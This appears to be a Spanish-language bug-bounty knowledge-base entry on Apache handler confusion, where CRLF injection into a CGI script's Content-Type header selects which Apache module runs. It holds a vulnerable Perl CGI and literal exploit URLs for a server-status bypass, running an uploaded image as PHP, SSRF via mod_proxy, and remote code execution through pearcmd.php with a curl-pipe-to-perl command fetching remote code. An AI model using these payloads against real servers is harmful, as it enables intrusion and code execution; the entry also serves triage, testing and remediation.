---
clase: protocolo
tech: apache-mod-cgi-proxy
cwe: CWE-93
cvss: 9.8 # [derivado] RCE. Corregido en Apache 2.4.60; CVE-2024-38476 encaja por descripcion
payload: |
  # MECANICA, cita LITERAL de la fuente:
  #   'if r->handler is empty, the content of the r->content_type is used as the final
  #    module handler'
  # Es decir: controlar la cabecera Content-Type de una respuesta equivale a elegir que
  # MODULO DE APACHE procesa la peticion.
  #
  # CGI VULNERABLE que da el control (inyeccion CRLF) - LITERAL de la fuente:
  #!/usr/bin/perl
  use CGI;
  my $q = CGI->new;
  my $redir = $q->param("r");
  if ($redir =~ m{^https?://}) {
      print "Location: $redir\n";
  }
  print "Content-Type: text/html\n\n";
  #
  # Los cuatro payloads, todos contra http://server/cgi-bin/redir.cgi.
  # LITERALES de la fuente, incluido el espacio antes de cada %0d%0a.
  #
  # 1) server-status, esquivando 'Require local':
  http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
  Location:/ooo %0d%0a
  Content-Type:server-status %0d%0a
  %0d%0a
  #
  # 2) ejecutar una IMAGEN SUBIDA como PHP:
  http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
  Location:/uploads/avatar.webp %0d%0a
  Content-Type:application/x-httpd-php %0d%0a
  %0d%0a
  #
  # 3) SSRF COMPLETA via mod_proxy:
  http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
  Location:/ooo %0d%0a
  Content-Type:proxy:http://example.com/%3F %0d%0a
  %0d%0a
  # Nota de la fuente: se añade X-Forwarded-For, lo que las protecciones de metadata de
  # EC2 y GCP bloquean.
  #
  # 4) RCE via pearcmd.php de PHP Docker e inyeccion de comandos en run-tests:
  http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
  Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
  Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
  %0d%0a
  #
  # Variante de socket Unix local, ejecuta un backdoor en /tmp:
  Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/tmp/ooo.php %0d%0a
  #
  # Modulos afectados que la fuente lista: mod_cgi, mod_cgid, mod_wsgi, mod_uwsgi,
  # mod_fastcgi, mod_perl, mod_asis, mod_fcgid, mod_proxy_scgi.
precondicion: "Hace falta CONTROL SOBRE LAS CABECERAS DE RESPUESTA de un script CGI — por inyeccion CRLF (el caso de la fuente) o por una SSRF que permita controlar la respuesta. Con eso, Content-Type elige el modulo. La fuente lista nueve modulos cuyas respuestas son explotables asi."
como_se_descubre: |
  Dos piezas que hay que buscar por separado:
  1. Un script CGI que refleje entrada del usuario en una cabecera de respuesta. El
     patron del ejemplo es clasico: un parametro de redireccion impreso en 'Location:'
     sin sanear. Una inyeccion CRLF ahi es el punto de entrada.
  2. Que el servidor sea Apache con alguno de los nueve modulos listados.
  Lo que hace a esta clase distinta de un CRLF normal: no se usa para partir la
  respuesta ni para fijar una cookie, sino para REDIRIGIR el procesamiento interno de
  Apache. El Content-Type deja de ser metadato y pasa a ser un selector de modulo.
  Reconocer eso es lo que convierte un 'CRLF de bajo impacto' —que muchos programas
  cierran como informativo— en un RCE.
control_negativo: |
  # [derivado] diseño de test A/B
  # A: payload 1 (Content-Type:server-status) -> la pagina de estado, pese a 'Require local'
  # B: GET /server-status directo -> 403 Forbidden (el control FUNCIONA)
  # C: el mismo CRLF con un Content-Type INOFENSIVO (text/plain)
  #    -> respuesta normal; aisla que el efecto viene del VALOR del Content-Type y no
  #       de la inyeccion CRLF en si
  # El control C es el que distingue este hallazgo de un CRLF corriente, y por tanto el
  # que justifica la severidad. Sin el, el informe se lee como 'hay inyeccion CRLF'.
mata: |
  - Apache 2.4.60 o posterior.
  - El CGI sanea las cabeceras de respuesta (no hay inyeccion CRLF).
  - El servidor no usa ninguno de los nueve modulos listados.
  - C tambien produce el efecto -> no es handler confusion, es otra cosa.
  - Para el payload 3: protecciones de metadata de EC2/GCP que rechazan peticiones con
    X-Forwarded-For (limitacion que la propia fuente señala).
fuente: "https://blog.orange.tw/posts/2024-08-confusion-attacks-en/ (Orange Tsai, 2024-08-09). Payloads, CGI vulnerable y lista de modulos literales. El payload de RCE cita el articulo de Phith0n sobre pearcmd.php. ADVERTENCIA: la seccion 3-1-2 del post esta REDACTADA en la fuente ('Overwrite Handler to ██████ ███████ ██████') y el noveno CVE del lote tambien; no se reconstruyen. CVE-2024-38476 ('may use exploitable/malicious backend application output to run local handlers via internal redirect') encaja por descripcion, pero la fuente NO lo mapea explicitamente a esta seccion."
confianza: alta
fecha: 2026-11-02
---
# [PROTOCOLO] Handler confusion en Apache — `Content-Type` como selector de módulo

## Principio
Cita literal de la causa raíz:

> *"if `r->handler` is empty, the content of the `r->content_type` is used as the final
> module handler"*

Eso significa que **controlar la cabecera `Content-Type` de una respuesta equivale a
elegir qué módulo de Apache procesa la petición**. El `Content-Type` deja de ser metadato
descriptivo y pasa a ser un selector de código ejecutable.

## El punto de entrada
Un CGI que refleje entrada del usuario en una cabecera. El ejemplo de la fuente es el
patrón más común que existe:

```perl
#!/usr/bin/perl

use CGI;
my $q = CGI->new;
my $redir = $q->param("r");
if ($redir =~ m{^https?://}) {
    print "Location: $redir\n";
}
print "Content-Type: text/html\n\n";
```

## Payloads
Todos contra `http://server/cgi-bin/redir.cgi`. El espacio antes de cada `%0d%0a` es de la
fuente.

**1 — Leer `server-status` esquivando `Require local`:**
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo %0d%0a
Content-Type:server-status %0d%0a
%0d%0a
```

**2 — Ejecutar una imagen subida como PHP:**
```
Content-Type:application/x-httpd-php %0d%0a
```
con `Location:/uploads/avatar.webp`

**3 — SSRF completa vía mod_proxy:**
```
Content-Type:proxy:http://example.com/%3F %0d%0a
```

**4 — RCE:**
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```

Módulos afectados que la fuente lista: `mod_cgi`, `mod_cgid`, `mod_wsgi`, `mod_uwsgi`,
`mod_fastcgi`, `mod_perl`, `mod_asis`, `mod_fcgid`, `mod_proxy_scgi`.

## Por qué esto reclasifica una clase entera de hallazgos
Una inyección CRLF en una cabecera de respuesta se suele triar como de bajo impacto:
partir la respuesta, fijar una cookie, quizá un XSS. Muchos programas la cierran como
informativa.

Aquí el mismo primitivo **redirige el procesamiento interno de Apache** y llega a
ejecución remota de código. Reconocer que el `Content-Type` es un selector de módulo es lo
que convierte un hallazgo archivable en el techo de impacto.

Es exactamente el argumento del principio 10 de `docs/ELITE-MINDSET.md`: el impacto no
está en la primitiva, está en el escenario que se construye con ella.

## El control que justifica la severidad
Repetir el mismo CRLF con un `Content-Type` inofensivo (`text/plain`). Si la respuesta es
normal, queda demostrado que el efecto viene del **valor** de la cabecera y no de la
inyección en sí. Sin ese control, el informe se lee como "hay inyección CRLF" y se
prioriza como tal.

## Nota de procedencia
La sección 3-1-2 del post está **redactada en la fuente**
(`Overwrite Handler to ██████ ███████ ██████`), y el noveno CVE del lote también. No los
reconstruyo.

## Impacto
Ejecución remota de código, SSRF completa, lectura de `server-status` y ejecución de
ficheros subidos como PHP — todo desde el control de una cabecera de respuesta.

## Remediación
Corregido en **Apache 2.4.60** (2024-07-01), con la advertencia de la fuente de que los
arreglos son incompatibles hacia atrás. `# [derivado]`: sanear CRLF en toda cabecera de
respuesta generada por CGI es la corrección del punto de entrada, y no depende de
actualizar Apache.
